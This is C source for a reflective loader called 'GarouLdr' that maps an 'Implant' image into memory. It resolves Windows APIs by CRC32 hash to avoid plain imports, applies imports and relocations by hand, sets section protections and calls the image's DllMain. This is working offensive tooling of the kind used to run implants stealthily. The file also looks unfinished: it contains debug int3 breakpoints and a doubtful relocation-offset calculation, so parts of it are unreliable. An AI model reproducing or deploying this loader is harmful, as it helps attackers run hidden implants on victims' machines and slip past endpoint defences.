#include <windows.h>
#include <win32.h>
#include <common.h>
#include <native.h>

typedef struct _GAROU_ARGS {
    PVOID OblivLdr;
    PVOID Implant;
    DWORD ImplantSize;
    PVOID TxtBase;
    PVOID TxtSize;
} GAROU_ARGS, *PGAROU_ARGS; 

D_SEC( B ) BOOL ResolveIat(
	_In_ PGAROU_API            GarouApi,
	_In_ PIMAGE_DATA_DIRECTORY EntryImport,
	_In_ UINT64 			   BaseAddress
) {
	PIMAGE_IMPORT_DESCRIPTOR ImportDesc = BaseAddress + EntryImport->VirtualAddress;

	for ( INT i = 0; ImportDesc->Name; ImportDesc++ ) {

		PIMAGE_THUNK_DATA IAT = BaseAddress + ImportDesc->FirstThunk;
		PIMAGE_THUNK_DATA ILT = BaseAddress + ImportDesc->OriginalFirstThunk;

		PCHAR DllName = BaseAddress + ImportDesc->Name;

		HMODULE hDll = LdrLoadModule( CRC32B(DllName) );
		if (!hDll) {
			hDll = GarouApi->LoadLibraryA( DllName );
			if (!hDll) {
				return FALSE;
			}
		}

		for (; ILT->u1.Function; IAT++, ILT++) {

			if ( IMAGE_SNAP_BY_ORDINAL( ILT->u1.Ordinal ) ) {
				LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(ILT->u1.Ordinal);
				IAT->u1.Function       = (DWORD_PTR)LdrLoadFunc(hDll, CRC32B(functionOrdinal));

				if ( !IAT->u1.Function ){
					return FALSE;
				}

			} else {
				IMAGE_IMPORT_BY_NAME* Hint = BaseAddress + ILT->u1.AddressOfData;
				IAT->u1.Function = LdrLoadFunc(hDll, CRC32B(Hint->Name));

				if ( !IAT->u1.Function ){
					return FALSE;
				}

			}
		}
	}
	
	return TRUE;
}

D_SEC( B ) BOOL FixRelocTable(
    _In_ PIMAGE_DATA_DIRECTORY EntryReloc,
    _In_ UINT64                BaseAddress,
    _In_ UINT64                RelocOffset
) {
    PIMAGE_BASE_RELOCATION ImgBaseReloc = (PIMAGE_BASE_RELOCATION)(BaseAddress + EntryReloc->VirtualAddress);

    while ( ImgBaseReloc->VirtualAddress ) {
        PBASE_RELOCATION_ENTRY EntryBaseReloc = (PBASE_RELOCATION_ENTRY)((UINT8*)ImgBaseReloc + sizeof(IMAGE_BASE_RELOCATION));
        UINT32 EntryCount = (ImgBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);

        for ( INT i = 0; i < EntryCount; i++ ) {
            UINT64 RelocAddress = (UINT64)(BaseAddress + ImgBaseReloc->VirtualAddress + EntryBaseReloc[i].Offset);

            switch ( EntryBaseReloc[i].Type ) {
                case IMAGE_REL_BASED_DIR64:
                    *(UINT64 *)RelocAddress += (UINT64)(RelocOffset); break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)RelocAddress += (DWORD)(RelocOffset); break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)RelocAddress += (WORD)(HIWORD(RelocOffset)); break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)RelocAddress += (WORD)(LOWORD(RelocOffset)); break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                // case IMAGE_REL_AMD64_REL32_4: {
                //     INT32 *RelativeOffset = (INT32 *)RelocAddress;
                //     UINT64 InstrAddress   = (UINT64)RelocAddress + 4;
                //     UINT64 TargetAddress  = InstrAddress + *RelativeOffset;
                //     INT64  newRelocOffset = TargetAddress - (InstrAddress + RelocOffset);
                //     if (newRelocOffset < INT_MIN || newRelocOffset > INT_MAX) {
                //         BK_PRINT("[!] Relocação excede limites de 32 bits: 0x%llX\n", newRelocOffset);
                //         break;
                //     }
                //     *RelativeOffset = (INT32)newRelocOffset;
                //     break;}
                
                default:
                    break;
            }
        }

        ImgBaseReloc = (PIMAGE_BASE_RELOCATION)((UINT8*)ImgBaseReloc + ImgBaseReloc->SizeOfBlock);
    }

    return TRUE;
}

D_SEC( B ) BOOL GarouLdr( 
	LPVOID lpParameter 
) {
	UINT64 GarouBase = GarouStart() + ( U_PTR( GarouRipEnd() ) - U_PTR( GarouStart() ) ) ;
	
	GAROU_API  GarouApi  = { 0 };
	GAROU_ARGS GarouArgs = { 0 };

    PBYTE  ImageBase   = NULL;
	UINT64 ImageSize   = 0;
	UINT32 RelocOffset = 0;
	PVOID  ProtBase    = NULL;
	UINT64 ProtSize    = 0;

	PIMAGE_NT_HEADERS		ImgNtHdrs   = { 0 };
	PIMAGE_SECTION_HEADER   SecHdr      = { 0 };
    PIMAGE_DATA_DIRECTORY   EntryReloc  = { 0 };
    PIMAGE_DATA_DIRECTORY   EntryImport = { 0 };

	PVOID Ntdll = LdrLoadModule( ntdlldll_H );

	GarouApi.NtAllocateVirtualMemory = LdrLoadFunc( Ntdll, NtAllocateVirtualMemory_H );
	GarouApi.NtProtectVirtualMemory  = LdrLoadFunc( Ntdll, NtProtectVirtualMemory_H );
	GarouApi.NtFlushInstructionCache = LdrLoadFunc( Ntdll, NtFlushInstructionCache_H );
	GarouApi.LdrLoadDll              = LdrLoadFunc( Ntdll, LdrLoadDll_H );
	GarouApi.LoadLibraryA            = LdrLoadFunc( LdrLoadModule( KERNEL32DLL_H ), LoadLibraryA_H );

	asm("int3");

	ImgNtHdrs   = ( GarouBase + ( (PIMAGE_DOS_HEADER)GarouBase )->e_lfanew );
    SecHdr      = IMAGE_FIRST_SECTION( ImgNtHdrs );
    EntryImport = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    EntryReloc  = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	ImageSize = ImgNtHdrs->OptionalHeader.SizeOfImage;

	asm("int3");

    GarouApi.NtAllocateVirtualMemory( NtCurrentProcess(), &ImageBase, 0, &ImageSize, 0x3000, 0x4 );

	asm("int3");

    for ( int i = 0 ; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
        MemCopy(
            C_PTR( ImageBase + SecHdr[i].VirtualAddress ),
            C_PTR( GarouBase + SecHdr[i].PointerToRawData ),
            SecHdr[i].SizeOfRawData
        );
    }

    RelocOffset = DEREF_64( ImageBase ) - ImgNtHdrs->OptionalHeader.ImageBase;

	ResolveIat( &GarouApi, EntryImport, ImageBase );
	FixRelocTable( EntryReloc, U_PTR( ImageBase ), U_PTR( RelocOffset ) );

    for ( int i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {

		DWORD	dwProtection	= 0x00;
		DWORD	dwOldProtection	= 0x00;

		if ( !SecHdr[i].SizeOfRawData || !SecHdr[i].VirtualAddress )
			continue;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			dwProtection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			dwProtection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			dwProtection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			dwProtection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			dwProtection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			dwProtection = PAGE_EXECUTE_READWRITE;

		ProtBase = (PVOID)(ImageBase + SecHdr[i].VirtualAddress);
		ProtSize = SecHdr[i].SizeOfRawData;
		GarouApi.NtProtectVirtualMemory( NtCurrentProcess(), &ProtBase, &ProtSize, dwProtection, &dwOldProtection );
	}

	GarouApi.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );

	ULONG_PTR EntryPoint = ( U_PTR( ImageBase ) + ImgNtHdrs->OptionalHeader.AddressOfEntryPoint );

	((fnDllMain)EntryPoint)( (HINSTANCE)ImageBase, DLL_PROCESS_ATTACH, NULL );

	return EntryPoint;
}
